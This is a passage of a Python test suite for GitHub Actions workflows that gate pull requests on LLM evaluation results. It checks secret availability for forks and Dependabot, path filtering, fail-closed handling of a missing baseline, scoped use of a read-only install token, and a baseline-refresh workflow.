        """Dependabot pull requests come from this repository but see only Dependabot secrets, not Actions secrets."""
        runner = self.scenario(actor="dependabot[bot]", secrets={})
        self.assertEqual(runner.jobs["check-secrets"]["outputs"], {"available": "false", "reason": "dependabot"})
        self.assertEqual(runner.jobs["evals"]["result"], "skipped")
        self.assertEqual(runner.jobs["gate"]["result"], "success")  # green only because FAIL_WITHOUT_SECRETS is false
        (warning,) = runner.annotations("gate", "warning")
        self.assertIn("opened by Dependabot", warning)
        self.assertIn("Settings > Secrets and variables > Dependabot", warning)
        self.assertNotIn("no API key secret is configured", warning)  # not the generic message: the key may well be set for Actions
        self.assertIn("Dependabot", runner.jobs["gate"]["summary"])
        strict = self.scenario(actor="dependabot[bot]", secrets={}, patch=lambda doc: doc["env"].update(FAIL_WITHOUT_SECRETS="true"))
        self.assertEqual(strict.jobs["gate"]["result"], "failure")
        # A human on the same repository without the secret keeps the generic message; a fork keeps its own.
        self.assertEqual(self.scenario(actor="octocat", secrets={}).jobs["check-secrets"]["outputs"]["reason"], "missing-secret")
        self.assertEqual(self.scenario(actor="dependabot[bot]", secrets={}, fork=True).jobs["check-secrets"]["outputs"]["reason"], "fork")

    def test_a_dependabot_pr_with_the_dependabot_secret_is_evaluated_like_any_other(self):
        runner = self.scenario(actor="dependabot[bot]", secrets={"ANTHROPIC_API_KEY": "sk-from-the-dependabot-secret-store"}, stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["check-secrets"]["outputs"], {"available": "true", "reason": ""})
        self.assertEqual(self.verdict(runner), "pass")
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_the_gate_job_runs_even_though_evals_was_skipped(self):
        """A skipped job counts as passed for branch protection; the always-run gate job is the one to require."""
        runner = self.scenario(fork=True, secrets={})
        self.assertEqual(runner.jobs["evals"]["result"], "skipped")
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_the_gate_fails_closed_when_the_secret_check_itself_did_not_answer(self):
        skipped = {j: {"result": "skipped", "outputs": {}} for j in ("trusted", "evals", "compare")}  # what `needs` of a failed job leaves behind
        runner = self.scenario(only=("gate",), seed={"check-secrets": {"result": "failure", "outputs": {}}, **RELEVANT, **skipped})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        (error,) = runner.annotations("gate", "error")
        self.assertIn("LLM eval key check failed", error)
        self.assertIn("not a quality regression", error)


def changes_script() -> str:
    """The Python program inside the `changes` job, exactly as shipped."""
    step = step_named(load_workflow(PR_WORKFLOW), "changes", "diff")
    (body,) = re.findall(r"<< 'PY'[^\n]*\n(.*?)\nPY\n", step["run"] + "\n", re.S)
    return body


@needs_tools
class PathFilterTests(PrWorkflowBase):
    """C3-06: the trigger has no `paths:` filter; the `changes` job decides and the always-running gate job reports.

    With "LLM evals gate" required in branch protection, a pull request that a `paths:` filter skips never receives the
    status and waits forever. So every pull request runs the workflow, the cheap `changes` job lists the changed files,
    and the gate passes with a note when nothing that can alter the LLM feature's output changed.
    """

    DOCS_ONLY = {"docs/notes.md": "typo fix\n", "README.md": "hello\n"}

    def relevant(self, edits: dict, eval_paths: str | None = None, **kwargs) -> Runner:
        def narrow(doc):
            if eval_paths is not None:
                doc["env"]["EVAL_PATHS"] = eval_paths

        return self.scenario(pr_edits=edits, only=("changes",), patch=narrow, **kwargs)

    def test_a_pr_that_touches_no_llm_code_skips_the_paid_run_and_the_gate_passes_with_a_note(self):
        runner = self.scenario(pr_edits=self.DOCS_ONLY, stub_env={"STUB_COMPARE_EXIT": 1})  # were compare to run, it would block
        self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "false"})
        self.assertIn("2 file(s) changed; 0 match EVAL_PATHS.", runner.jobs["changes"]["log"])
        self.assertEqual({runner.jobs[j]["result"] for j in ("trusted", "evals", "compare")}, {"skipped"})  # nothing paid for, nothing read
        self.assertEqual(runner.jobs["comment"]["result"], "skipped")
        self.assertEqual(self.calls(runner), [])  # no pip install, no evalsprint, no gh
        self.assertEqual(list(runner.artifacts.iterdir()), [])
        self.assertEqual(runner.jobs["gate"]["result"], "success")  # the required check reports, so the PR is not left waiting
        self.assertEqual(runner.annotations("gate", "error"), [])
        self.assertEqual(runner.annotations("gate", "warning"), [])
        (notice,) = runner.annotations("gate", "notice")
        self.assertIn("LLM evals skipped", notice)
        summary = runner.jobs["gate"]["summary"]
        self.assertIn("no LLM code changed", summary)
        self.assertIn("passes without a comparison", summary)
        self.assertIn("EVAL_PATHS", summary)  # tells the reader where to add a path they think is missing

    def test_the_skip_does_not_depend_on_secrets_or_the_baseline_and_is_not_reported_as_unverified(self):
        for label, kwargs in (
            ("fork without secrets", {"fork": True, "secrets": {}}),
            ("dependabot without secrets", {"actor": "dependabot[bot]", "secrets": {}}),
            ("base branch without a baseline", {"origin": make_origin(self.tmp / "origin_nobase", with_baseline=False)}),
            ("base branch that lost its baseline", {"origin": make_origin(self.tmp / "origin_lostbase", then=delete_baseline)}),
        ):
            with self.subTest(label):
                runner = self.scenario(pr_edits=self.DOCS_ONLY, **kwargs)
                self.assertEqual(runner.jobs["gate"]["result"], "success")
                self.assertEqual(runner.annotations("gate", "warning"), [])  # "LLM evals did not run" is for PRs that needed them
                self.assertIn("no LLM code changed", runner.jobs["gate"]["summary"])
                self.assertEqual(self.calls(runner), [])

    def test_a_relevant_change_from_a_fork_still_warns_that_nothing_was_verified(self):
        runner = self.scenario(fork=True, secrets={})  # the default PR edits a prompt
        self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "true"})
        (warning,) = runner.annotations("gate", "warning")
        self.assertIn("LLM evals did not run", warning)

    def test_each_kind_of_llm_change_starts_the_evals(self):
        for path in (
            "prompts/system.txt",
            "src/llm/client.py",
            "src/llm/deep/er/tool.py",
            "evals/cases.jsonl",
            "evals/eval.yaml",
            "evals/baseline/summary.json",
            ".github/workflows/evals.yml",
            ".github/workflows/evals-baseline.yml",
        ):
            with self.subTest(path=path):
                runner = self.relevant({path: "changed\n", "docs/notes.md": "and a doc\n"})
                self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "true"}, runner.jobs["changes"]["log"])
                self.assertIn(f"relevant: {path}", runner.jobs["changes"]["log"])

    def test_evals_and_the_eval_workflows_stay_relevant_when_the_list_is_narrowed_or_emptied(self):
        for eval_paths in ("nothing-here/**", "", "# only comments\n"):
            for path, expected in (
                ("evals/cases.jsonl", "true"),
                (".github/workflows/evals.yml", "true"),
                (".github/workflows/evals-baseline.yml", "true"),
                ("src/llm/prompt.txt", "false"),
            ):
                with self.subTest(eval_paths=eval_paths, path=path):
                    self.assertEqual(self.relevant({path: "x\n"}, eval_paths).jobs["changes"]["outputs"], {"relevant": expected})

    def test_comments_and_blank_lines_in_the_list_are_ignored(self):
        listed = "# src/llm/**\n\n   prompts/**   \n"
        self.assertEqual(self.relevant({"src/llm/a.py": "x\n"}, listed).jobs["changes"]["outputs"], {"relevant": "false"})
        self.assertEqual(self.relevant({"prompts/a.txt": "x\n"}, listed).jobs["changes"]["outputs"], {"relevant": "true"})

    def test_an_empty_list_warns_because_it_is_almost_certainly_a_mistake(self):
        for empty in ("", "# only comments\n\n"):  # a list of comments is as empty as no list
            with self.subTest(eval_paths=empty):
                runner = self.relevant({"docs/a.md": "x\n"}, empty)
                (warning,) = runner.annotations("changes", "warning")
                self.assertIn("EVAL_PATHS is empty", warning)
                self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "false"})
        self.assertEqual(self.relevant({"docs/a.md": "x\n"}).annotations("changes", "warning"), [])

    def test_deleting_or_moving_a_prompt_out_of_the_folder_counts_as_a_change_to_it(self):
        deleted = self.relevant({"src/llm/prompt.txt": None})
        self.assertEqual(deleted.jobs["changes"]["outputs"], {"relevant": "true"})
        # With rename detection git would list only the new name (outside EVAL_PATHS): both names must be listed.
        moved = self.relevant({"src/llm/prompt.txt": None, "docs/prompt-moved.txt": "v1\n"})  # same content as the original
        self.assertEqual(moved.jobs["changes"]["outputs"], {"relevant": "true"}, moved.jobs["changes"]["log"])
        self.assertIn("relevant: src/llm/prompt.txt", moved.jobs["changes"]["log"])

    def test_a_manual_run_is_always_relevant(self):
        runner = self.scenario(event="workflow_dispatch", only=("changes",))
        self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "true"})
        self.assertIn("Manual run", runner.jobs["changes"]["log"])

    def test_when_head_is_not_a_merge_commit_the_evals_run_and_it_says_so(self):
        """Fail safe: a diff that cannot be trusted to show the whole change never skips the gate."""
        runner = self.scenario(pr_edits=self.DOCS_ONLY, merge=False, only=("changes",))
        self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "true"})
        (warning,) = runner.annotations("changes", "warning")
        self.assertIn("Cannot tell what changed", warning)
        self.assertIn("1 parent(s)", warning)

    def test_only_the_change_of_the_pull_request_is_looked_at_not_the_history_of_the_base(self):
        """Parent 1 of the merge commit is the base branch: an old LLM change on main must not make a docs PR relevant."""
        busy_main = make_origin(self.tmp / "origin_busy_main", then=lambda seed: write(seed / "src" / "llm" / "prompt.txt", "v2, merged yesterday\n"))
        runner = self.scenario(origin=busy_main, pr_edits=self.DOCS_ONLY, only=("changes",))
        self.assertEqual(runner.jobs["changes"]["outputs"], {"relevant": "false"})

    def test_a_failed_path_check_fails_the_gate_closed_without_paying_for_anything(self):
        runner = self.scenario(clone=False, files={"README.md": "not a git checkout\n"})  # `git rev-list` cannot run
        self.assertEqual(runner.jobs["changes"]["result"], "failure")
        self.assertEqual(runner.jobs["evals"]["result"], "skipped")
        self.assertEqual(runner.jobs["trusted"]["result"], "skipped")
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        (error,) = runner.annotations("gate", "error")
        self.assertIn("LLM eval path check failed", error)
        self.assertIn("not a quality regression", error)
        self.assertEqual(self.calls(runner), [])

    def test_a_path_check_that_answered_nothing_also_fails_the_gate(self):
        runner = self.scenario(only=("gate",), seed={**KEYS, "changes": {"outputs": {}}, **TRUSTED_OK, "evals": {"result": "skipped"}, "compare": {"result": "skipped"}})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("no verdict", runner.annotations("gate", "error")[0])

    def test_the_changes_job_sees_the_merge_of_the_pr_into_the_base(self):
        """The same kind of workspace the evals job gets: a merge commit whose first parent is the base branch."""
        runner = self.scenario(only=("changes",))
        ws = runner.changes_workspace
        parents = git(ws, "rev-list", "--parents", "-n", "1", "HEAD").split()[1:]
        self.assertEqual(len(parents), 2)
        self.assertEqual(parents[0], git(ws, "rev-parse", "origin/main"))


class GlobTests(unittest.TestCase):
    """EVAL_PATHS globs, checked on the very function the `changes` job runs."""

    @classmethod
    def setUpClass(cls):
        head = changes_script().split('if os.environ["EVENT_NAME"]', 1)[0]
        namespace: dict = {}
        exec(compile(head, "changes-job", "exec"), namespace)  # noqa: S102 - the shipped template, definitions only
        cls.regex = staticmethod(namespace["regex"])

    def matches(self, pattern: str, name: str) -> bool:
        return bool(self.regex(pattern).fullmatch(name))

    def test_star_stays_inside_a_folder_and_double_star_crosses_folders(self):
        table = [
            ("prompts/**", "prompts/a.txt", True),
            ("prompts/**", "prompts/a/b/c.txt", True),
            ("prompts/**", "myprompts/a.txt", False),  # anchored at the repository root
            ("prompts/**", "docs/prompts/a.txt", False),
            ("src/*.py", "src/a.py", True),
            ("src/*.py", "src/x/a.py", False),
            ("src/*", "src/a", True),
            ("src/*", "src/a/b", False),
            ("**/*.prompt", "a.prompt", True),  # zero folders
            ("**/*.prompt", "deep/er/a.prompt", True),
            ("**/*.prompt", "a.prompt.bak", False),
            ("**/prompt.txt", "prompt.txt", True),
            ("**/prompt.txt", "a/b/prompt.txt", True),
            ("**/prompt.txt", "a/bprompt.txt", False),
            ("src/llm/", "src/llm/a.py", True),  # a trailing slash means everything below
            ("src/llm/", "src/llm", False),
            ("config/llm.yaml", "config/llm.yaml", True),
            ("config/llm.yaml", "config/llm.yml", False),
            ("config/llm.yaml", "config/llmXyaml", False),  # a dot is a dot
            ("app/prompt?.txt", "app/prompt1.txt", True),
            ("app/prompt?.txt", "app/prompt.txt", False),
            ("app/prompt?.txt", "app/prompt/.txt", False),  # ? never matches a slash
            ("a+b/**", "a+b/x", True),  # regex characters are literal
            ("a+b/**", "aab/x", False),
            ("[x]/**", "[x]/a", True),
            ("[x]/**", "x/a", False),
            ("(v1)/**", "(v1)/a", True),
        ]
        for pattern, name, expected in table:
            with self.subTest(pattern=pattern, name=name):
                self.assertEqual(self.matches(pattern, name), expected)

    def test_a_star_does_not_backtrack_across_a_slash(self):
        self.assertFalse(self.matches("a*/b", "a/x/b"))
        self.assertTrue(self.matches("a*/b", "abc/b"))
        self.assertTrue(self.matches("a**b", "a/x/b"))  # ** inside a name crosses folders


@needs_tools
class MissingBaselineTests(PrWorkflowBase):
    """C3-01: a base branch that lost its baseline fails closed; only the very first install may pass without one.

    Without this a merged pull request that deletes evals/baseline/ turns the gate off for every later pull request
    (nothing left to compare with, so "bootstrap" and a green check) and nobody is told.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.lost = make_origin(cls.tmp / "origin_lost", then=delete_baseline)

    @staticmethod
    def require(doc):
        doc["env"]["REQUIRE_BASELINE"] = "true"

    def assert_fails_closed_without_a_paid_run(self, runner: Runner, why: str) -> None:
        compare = runner.jobs["compare"]
        self.assertEqual(runner.jobs["trusted"]["result"], "success", runner.jobs["trusted"]["log"])
        self.assertEqual(compare["result"], "success", compare["log"])  # the worker job answers; the gate job judges
        self.assertEqual(compare["outputs"], {"verdict": "baseline_missing", "exit_code": "2"})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertEqual(runner.jobs["evals"]["result"], "skipped")  # the job that runs PR code next to the API keys never started
        self.assertEqual(self.calls(runner, "evalsprint"), [])  # nothing was run or compared...
        self.assertEqual(self.calls(runner, "pip"), [])  # ...nothing was installed...
        self.assertEqual(compare["steps"]["install"]["outcome"], "skipped")  # ...and the API keys were never used
        self.assertTrue(any("Baseline missing on the base branch" in line for line in runner.annotations("trusted", "error")))
        (error,) = runner.annotations("gate", "error")
        self.assertIn("LLM eval baseline missing", error)
        self.assertIn("Not a quality regression", error)
        text = self.gate_md(runner)
        self.assertIn("baseline missing on the base branch", text)
        self.assertIn("**fails**", text)
        self.assertIn("**not a quality regression**", text)
        self.assertIn("the paid run was skipped", text)
        self.assertIn(why, text)
        self.assertNotIn("come from `main`", text)  # no trusted gate or baseline was used, so the footer does not claim one
        (posted,) = [c["body"] for c in self.gh_state(runner)["comments"]]  # the pull request is told, too
        self.assertIn("baseline missing on the base branch", posted)

    def test_a_base_branch_whose_history_shows_a_deleted_baseline_fails_closed(self):
        runner = self.scenario(origin=self.lost)
        self.assert_fails_closed_without_a_paid_run(runner, "the history of main shows that evals/baseline/ existed (last touched by commit ")
        self.assertIn("gone or incomplete", self.gate_md(runner))

    def test_an_incomplete_baseline_counts_as_lost(self):
        half = make_origin(self.tmp / "origin_half", then=delete_summary_only)  # results.jsonl is still there, summary.json is not
        self.assert_fails_closed_without_a_paid_run(self.scenario(origin=half), "the history of main shows that evals/baseline/ existed")

    def test_require_baseline_fails_closed_even_when_there_never_was_one(self):
        bare = make_origin(self.tmp / "origin_never", with_baseline=False)
        runner = self.scenario(origin=bare, patch=self.require)
        self.assert_fails_closed_without_a_paid_run(runner, 'and REQUIRE_BASELINE is "true" in this workflow')

    def test_the_first_install_is_allowed_to_pass_and_says_how_to_turn_the_gate_on(self):
        """Nothing in the history of evals/baseline and REQUIRE_BASELINE false: the pull request that installs the evals."""
        for label, origin in (
            ("nothing installed yet", make_origin(self.tmp / "origin_first_a", with_baseline=False)),
            ("evals/eval.yaml merged, first baseline not yet", make_origin(self.tmp / "origin_first_b", with_baseline=False, then=add_eval_yaml_only)),
        ):
            with self.subTest(label):
                runner = self.scenario(origin=origin)
                self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "bootstrap", "exit_code": "0"})
                self.assertEqual(runner.jobs["gate"]["result"], "success")
                (warning,) = runner.annotations("trusted", "warning")
                self.assertIn("No baseline on the base branch", warning)
                self.assertIn("set REQUIRE_BASELINE to true", warning)
                self.assertIn("set REQUIRE_BASELINE to true", runner.annotations("gate", "warning")[0])
                self.assertIn("`REQUIRE_BASELINE`", self.gate_md(runner))
                self.assertEqual(self.evalsprint_commands(runner), ["run", "report"])  # the suite ran, but nothing was compared

    def test_require_baseline_changes_nothing_while_the_baseline_exists(self):
        runner = self.scenario(patch=self.require, stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "pass", "exit_code": "0"})
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_a_restored_baseline_gates_normally_again(self):
        """The history still shows the deletion, but the baseline is there now: judged as usual, against it."""
        restored = make_origin(self.tmp / "origin_restored", then=restore_baseline)
        runner = self.scenario(origin=restored, stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "pass", "exit_code": "0"})
        self.assertEqual(self.evalsprint_commands(runner), ["run", "compare", "report"])

    def test_the_pull_request_that_restores_the_baseline_is_judged_by_the_base_branch_too(self):
        """Deliberate: the check cannot tell a legitimate restore from a pull request that ships its own reference.
        The message says so; the owner merges that one pull request with an admin override."""
        runner = self.scenario(origin=self.lost, pr_edits={"evals/baseline/summary.json": json.dumps(BASE_SUMMARY), "evals/baseline/results.jsonl": ""})
        self.assertIsNone(runner.workspace)  # the PR does carry a baseline, but its code is never even checked out...
        self.assert_fails_closed_without_a_paid_run(runner, "the history of main shows")  # ...and what it carries is not trusted
        self.assertIn("admin override", self.gate_md(runner))

    def test_the_verdict_step_never_lets_a_missing_baseline_become_a_pass(self):
        """Even if a run somehow happened (exit codes 0 and 0), a base that is marked missing decides the verdict."""
        runner = self.scenario(
            clone=False,
            only=("compare", "gate"),
            seed={
                **KEYS,
                **RELEVANT,
                "trusted": {"outputs": {"available": "false", "missing": "true", "missing_why": 'REQUIRE_BASELINE is "true" in this workflow', "base_sha": ""}},
                "evals": {"outputs": {"run_exit_code": "0"}},
            },
            start_at={"compare": "verdict"},
            seed_steps={"compare": {"plan": {"outputs": {"files": "true", "kit": "false"}}, "download": {"outputs": {}, "outcome": "success"}, "compare": {"outputs": {"exit_code": "0"}}}},
        )
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "baseline_missing", "exit_code": "2"})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn('and REQUIRE_BASELINE is "true" in this workflow', self.gate_md(runner))

    def test_the_gate_job_fails_on_the_missing_baseline_verdict_by_itself(self):
        runner = self.scenario(only=("gate",), seed={**KEYS, **RELEVANT, **TRUSTED_OK, "evals": {"result": "skipped"}, "compare": {"outputs": {"verdict": "baseline_missing", "exit_code": "2"}}})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("LLM eval baseline missing", runner.annotations("gate", "error")[0])


@needs_tools
class PrivateKitTokenTests(PrWorkflowBase):
    """The read-only token for a private kit repository exists only while pip installs the kit, in either job that installs it."""

    INSTALL = {"evals": "Install dependencies", "compare": "Install the kit from the base branch"}

    def install(self, job: str, secrets: dict, **stub_env) -> Runner:
        step = self.INSTALL[job]

        def only_the_install_step(doc):
            steps = doc["jobs"][job]["steps"]
            doc["jobs"][job]["steps"] = steps[: [s.get("name") for s in steps].index(step) + 1]

        seeded = {**KEYS, **RELEVANT, **TRUSTED_OK, "evals": {"outputs": {"run_exit_code": "0"}}}
        seeded.pop(job, None)  # the job under test is the one that runs
        return self.scenario(
            clone=False, only=(job,), seed=seeded, patch=only_the_install_step, secrets=secrets, start_at={job: step}, stub_env=stub_env,
            seed_steps={"compare": {"plan": {"outputs": {"files": "true", "kit": "true"}}}},
        )

    def after(self, runner: Runner, job: str) -> str:
        done = subprocess.run(["git", "config", "--global", "--get-regexp", "insteadof"], env={**os.environ, "HOME": str(runner.home_of(job))}, capture_output=True, text=True)
        return done.stdout.strip()

    def test_the_read_token_exists_only_while_pip_installs_the_kit(self):
        for job in self.INSTALL:
            with self.subTest(job=job):
                runner = self.install(job, {"ANTHROPIC_API_KEY": "sk-test", "EVALSPRINT_READ_TOKEN": "tok_read_only"})
                self.assertEqual(runner.jobs[job]["result"], "success", runner.jobs[job]["log"])
                (pip,) = self.calls(runner, "pip")
                self.assertEqual(pip["args"], ["install", "-r", "evals/requirements.txt"])
                self.assertEqual(pip["job"], job)
                self.assertIn("x-access-token:tok_read_only@github.com", pip["git_rewrite_during_install"])
                self.assertEqual(self.after(runner, job), "")  # removed again before anything else runs (in the evals job: before the PR's code)
                self.assertNotIn("tok_read_only", runner.jobs[job]["log"])

    def test_the_token_is_removed_even_when_the_install_fails(self):
        for job in self.INSTALL:
            with self.subTest(job=job):
                runner = self.install(job, {"ANTHROPIC_API_KEY": "sk", "EVALSPRINT_READ_TOKEN": "tok_read_only"}, STUB_PIP_EXIT=1)
                self.assertEqual(runner.jobs[job]["result"], "failure")
                self.assertEqual(self.after(runner, job), "")

    def test_without_the_token_git_is_left_alone(self):
        for job in self.INSTALL:
            with self.subTest(job=job):
                runner = self.install(job, {"ANTHROPIC_API_KEY": "sk-test"})
                (pip,) = self.calls(runner, "pip")
                self.assertEqual(pip["git_rewrite_during_install"], "")


# ---------------------------------------------------------------------- baseline workflow


@needs_tools
class BaselineWorkflowTests(PrWorkflowBase):
    HEALTHY = {
        "run_id": "20260929-101500-baseline-abc1234",
        "n_cases": 40,
        "n_scored": 38,
        "pass_rate": 0.842,
        "n_errors": 2,
        "n_target_errors": 1,
        "n_judge_errors": 1,
        "cost": {"system_mean_usd": 0.0123},
        "latency": {"p95_s": 2.5},
        "stability": {"n_repeated": 8, "flip_rate": 0.125},
    }

    def baseline_run(self, **stub_env) -> Runner:
        env = {"STUB_SUMMARY": json.dumps(self.HEALTHY), **stub_env}
        return self.scenario(workflow=BASELINE_WORKFLOW, event="workflow_dispatch", stub_env=env, secrets={"ANTHROPIC_API_KEY": "sk-test"})

    def test_healthy_run_opens_a_pr_with_errors_calibration_and_the_previous_pass_rate(self):
        runner = self.baseline_run()
        job = runner.jobs["baseline"]
        self.assertEqual(job["result"], "success", job["log"])
        (pr,) = self.gh_state(runner)["prs"]
        body = pr["body"]
        self.assertTrue(pr["head"].startswith("evals/baseline-"))
        self.assertEqual(pr["base"], "main")
        self.assertIn("| Errors | 2 of 40 cases (target 1, judge 1) |", body)
        self.assertIn("| Pass rate | 84.2% (previous baseline 75.0%, change +9.2 p.p.) |", body)
        self.assertIn("judge `quality`: weighted kappa 0.81 (95% CI 0.70 to 0.90), decision `usable`, 60 labels", body)
        self.assertNotIn("0.55", body)  # the unweighted sample kappa is not what the gate reads
        self.assertNotIn("predates the weighted kappa", body)
        self.assertIn("Carried over from run `20251201-000000-old`", body)
        self.assertIn("| Repeated cases / flip rate | 8 / 12.5% |", body)
        self.assertIn("Check before merging", body)  # errors > 0
        # calibration.json was copied into the run before `evalsprint baseline`, so the refresh keeps it.
        self.assertTrue((runner.workspace / "evals" / "baseline" / "calibration.json").exists())
        calls = self.calls(runner, "evalsprint")
        self.assertEqual([c["args"][0] for c in calls], ["run", "baseline"])
        self.assertNotIn("--force", calls[1]["args"])
        self.assertIn("refs/heads/evals/baseline-", git(runner.workspace, "ls-remote", "--heads", "origin"))

    def test_every_run_pushes_to_its_own_copy_of_the_origin(self):
        """C3-10: the branch name is a timestamp, so two runs in the same second used to collide on a shared origin.

        A `date` that always says the same second, and two runs whose baselines differ, make that collision certain (on one
        shared origin the second push is rejected as a non-fast-forward). Each scenario has its own bare copy of the origin,
        so both runs succeed, both push the same branch name, and the origin they started from is never touched.
        """
        frozen = {"date": "import sys\nprint('20260929-101500')\n"}
        other = {**self.HEALTHY, "run_id": "20260929-101600-baseline-def5678"}
        first = self.scenario(workflow=BASELINE_WORKFLOW, event="workflow_dispatch", stubs=frozen, stub_env={"STUB_SUMMARY": json.dumps(self.HEALTHY)}, secrets={"ANTHROPIC_API_KEY": "sk"})
        second = self.scenario(workflow=BASELINE_WORKFLOW, event="workflow_dispatch", stubs=frozen, stub_env={"STUB_SUMMARY": json.dumps(other)}, secrets={"ANTHROPIC_API_KEY": "sk"})
        for runner in (first, second):
            self.assertEqual(runner.jobs["baseline"]["result"], "success", runner.jobs["baseline"]["log"])
            self.assertIn("refs/heads/evals/baseline-20260929-101500", git(runner.workspace, "ls-remote", "--heads", "origin"))
        self.assertNotEqual(first.private_origin, second.private_origin)
        self.assertNotIn("evals/baseline-", git(self.tmp, "ls-remote", "--heads", f"file://{self.origin}"))

    def test_a_baseline_without_calibration_says_so(self):
        uncalibrated = make_origin(self.tmp / "origin_uncalibrated", calibrated=False)
        runner = self.scenario(
            workflow=BASELINE_WORKFLOW, origin=uncalibrated, event="workflow_dispatch", stub_env={"STUB_SUMMARY": json.dumps(self.HEALTHY)}, secrets={"ANTHROPIC_API_KEY": "sk"}
        )
        (pr,) = self.gh_state(runner)["prs"]
        self.assertIn("**not calibrated**", pr["body"])
        self.assertFalse((runner.workspace / "evals" / "baseline" / "calibration.json").exists())

    def test_a_calibration_written_before_the_weighted_kappa_is_shown_as_unweighted_and_flagged(self):
        legacy = make_origin(self.tmp / "origin_legacy_calibration", calibrated=LEGACY_CALIBRATION)
        runner = self.scenario(
            workflow=BASELINE_WORKFLOW, origin=legacy, event="workflow_dispatch", stub_env={"STUB_SUMMARY": json.dumps(self.HEALTHY)}, secrets={"ANTHROPIC_API_KEY": "sk"}
        )
        (pr,) = self.gh_state(runner)["prs"]
        self.assertIn("judge `quality`: unweighted kappa 0.81 (95% CI 0.70 to 0.90), decision `usable`, 60 labels", pr["body"])
        self.assertIn("predates the weighted kappa the gate reads", pr["body"])

    @staticmethod
    def results(**shas: str) -> str:
        return "".join(json.dumps({"case_id": cid, "case_sha": sha}) + "\n" for cid, sha in shas.items())

    def test_a_baseline_pr_names_changed_judges_and_a_changed_test_set(self):
        old = make_origin(self.tmp / "origin_old_judges", summary={**BASE_SUMMARY, "judges_sha": "aaaaaaaaaaaa"}, results=self.results(a="s1", b="s2", c="s3"))
        stub_env = {
            "STUB_SUMMARY": json.dumps({**self.HEALTHY, "judges_sha": "bbbbbbbbbbbb"}),
            "STUB_RESULTS": self.results(a="s1", b="sX", d="s4"),  # b edited, c removed, d added
        }
        runner = self.scenario(workflow=BASELINE_WORKFLOW, origin=old, event="workflow_dispatch", stub_env=stub_env, secrets={"ANTHROPIC_API_KEY": "sk"})
        self.assertEqual(runner.jobs["baseline"]["result"], "success", runner.jobs["baseline"]["log"])
        (pr,) = self.gh_state(runner)["prs"]
        body = pr["body"]
        self.assertIn("| Judges | **changed** (`aaaaaaaaaaaa` to `bbbbbbbbbbbb`)", body)
        self.assertIn("pass rates before and after are not comparable", body)
        self.assertIn("| Test set against the previous baseline | 1 added (`d`), 1 removed (`c`), 1 edited (`b`) |", body)
        self.assertIn("the judges changed since the previous baseline", body)
        self.assertIn("re-label a sample and re-run `evalsprint calibrate`", body)  # calibration.json was carried over from the old judge
        self.assertIn("1 case(s) were removed and 1 edited", body)

    def test_unchanged_judges_and_test_set_add_no_warning(self):
        same = make_origin(self.tmp / "origin_same_judges", summary={**BASE_SUMMARY, "judges_sha": "aaaaaaaaaaaa"}, results=self.results(a="s1", b="s2"))
        stub_env = {"STUB_SUMMARY": json.dumps({**self.HEALTHY, "judges_sha": "aaaaaaaaaaaa"}), "STUB_RESULTS": self.results(a="s1", b="s2")}
        runner = self.scenario(workflow=BASELINE_WORKFLOW, origin=same, event="workflow_dispatch", stub_env=stub_env, secrets={"ANTHROPIC_API_KEY": "sk"})
        (pr,) = self.gh_state(runner)["prs"]
        self.assertIn("| Judges | unchanged (`aaaaaaaaaaaa`) |", pr["body"])
        self.assertNotIn("Test set against the previous baseline", pr["body"])
        self.assertNotIn("the judges changed", pr["body"])
        self.assertNotIn("were removed", pr["body"])

    def test_a_run_from_an_older_evalsprint_says_it_cannot_tell(self):
        runner = self.baseline_run()  # HEALTHY has no judges_sha
        (pr,) = self.gh_state(runner)["prs"]
        self.assertIn("| Judges | n/a (this run was written by an older evalsprint", pr["body"])

    def run_step_only(self, code: int) -> Runner:
        """The 'Run the suite' step (and whatever would follow it) when `evalsprint run` exits with `code`."""
        return self.scenario(
            workflow=BASELINE_WORKFLOW, event="workflow_dispatch", clone=False, start_at={"baseline": "Run the suite"},
            stub_env={"STUB_RUN_EXIT": code, "STUB_SUMMARY": json.dumps(self.HEALTHY)}, secrets={"ANTHROPIC_API_KEY": "sk-test"},
        )

    def test_an_unhealthy_run_is_refused_and_nothing_is_proposed(self):
        runner = self.run_step_only(3)
        job = runner.jobs["baseline"]
        self.assertEqual(job["result"], "failure")
        self.assertIn("Baseline refused", job["log"])
        self.assertIn("unhealthy", job["log"])
        self.assertEqual(self.evalsprint_commands(runner), ["run"])  # never reaches `baseline`
        self.assertEqual(self.calls(runner, "gh"), [])  # and never opens a pull request
        self.assertFalse((runner.workspace / "evals").exists())  # nothing was copied anywhere

    def test_config_error_and_other_failures_are_reported_and_stop_the_workflow(self):
        for code, expected in ((2, "Eval configuration error"), (1, "Baseline run failed"), (137, "exited with code 137")):
            with self.subTest(code=code):
                runner = self.run_step_only(code)
                self.assertEqual(runner.jobs["baseline"]["result"], "failure")
                self.assertIn(expected, runner.jobs["baseline"]["log"])
                self.assertEqual(self.evalsprint_commands(runner), ["run"])
                self.assertEqual(self.calls(runner, "gh"), [])

    def test_a_placeholder_run_is_refused_and_nothing_is_proposed(self):
        """C18: the scaffold's offline stub (or a judge on the mock provider) makes `summary.placeholder` true; such a run is never a baseline."""
        runner = self.baseline_run(STUB_SUMMARY=json.dumps({**self.HEALTHY, "placeholder": True}))
